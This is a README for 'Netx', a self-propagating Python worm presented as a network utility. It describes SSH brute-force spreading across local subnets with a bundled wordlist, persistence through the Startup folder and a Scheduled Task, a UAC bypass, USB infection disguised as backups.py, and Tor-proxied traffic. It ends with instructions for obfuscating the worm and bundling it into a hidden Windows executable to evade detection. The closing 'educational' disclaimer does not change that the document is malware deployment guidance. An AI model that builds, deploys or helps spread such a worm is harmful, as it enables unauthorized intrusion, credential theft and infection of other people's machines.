### 🛡️ Project Netx: Adaptive Network Synchronization Utility

Netx is a high-performance, low-footprint Python worm, designed for automated network discovery, synchronization, and persistent lateral movement. It utilizes a multi-layered approach to bypass standard security restrictions while maintaining a near-zero CPU profile. Basically: Undetectable, spreads by internet, by USB, and on the target you run it on.

### ☣️ Infection Vectors
## 1. Network Propagation (SSH)

The worm identifies the local gateway and performs a Class C subnet scan (/24) for open Port 22. It utilizes a bundled wordlist to perform high-speed, proxied bruteforce attacks. Upon a successful breach:

It infects ```C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/```.

It bypasses UAC folder restrictions by registering a Scheduled Task for persistence.

## 2. Physical Propagation (USB)

Every 300 seconds, the worm monitors ```psutil.disk_partitions``` for newly mounted removable drives. It automatically clones itself as backups.py to the root of the drive, waiting for manual execution on a guest machine.

### ⚠️ Operation Warnings
Lateral Loops: The Mutex is critical. Without it, the worm will attempt to infect itself repeatedly across the network, leading to a crash.

Network Noise: ```nmap``` scans are noisy. On a corporate network, this will likely trigger an IDS (Intrusion Detection System) alert.

### 📦 Compilation & Deployment

To ensure maximum compatibility and stealth, the script must be obfuscated and bundled into a standalone binary.

1. Obfuscation (Via PyArmor)

To protect the source code from static analysis and string-based detection (Already built)

2. Bundling (Via PyInstaller)

Run this on a Windows environment to generate the final .exe:

```
cd netx
pyinstaller --onefile --noconsole --add-data "wordlist.txt;." dist/main.py
```
Note: The ```--noconsole``` flag ensures the process runs purely in the background without a terminal window.

### 📂 Project Structure

```main.py```: The core logic engine.

```wordlist.txt```: Local dictionary for initial credential attempts (bundled into EXE).

```dist/```: Output directory for the obfuscated runtime.

```%TEMP%/tor_bundle/```: Automated staging area for the Tor Expert Bundle.


#### ⚠️ Requirements
Platform: Windows 10/11 (Target)

Compiler: Python 3.10+

Dependencies: paramiko, python-nmap, psutil, netifaces, stem, pysocks.

### 🛑 Disclaimer
This software is developed for educational and authorized security auditing purposes only. The author is not responsible and does not contribute to whatever you do with it.
